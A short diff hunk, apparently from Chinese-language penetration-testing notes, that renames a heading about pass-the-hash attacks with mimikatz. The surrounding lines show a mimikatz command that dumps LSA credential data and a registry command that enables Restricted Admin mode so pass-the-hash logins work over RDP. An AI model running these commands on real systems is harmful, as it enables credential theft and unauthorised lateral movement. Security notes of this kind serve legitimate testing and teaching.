@@ -284,7 +284,7 @@ lsadump::lsa /inject
     REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
     ```
 
-**mimikatz进行哈希传递攻击PtH**
+**mimikatz 进行 PtH**
 
 1. (工作组)通过 pth 进行远程登录(cmd)
 
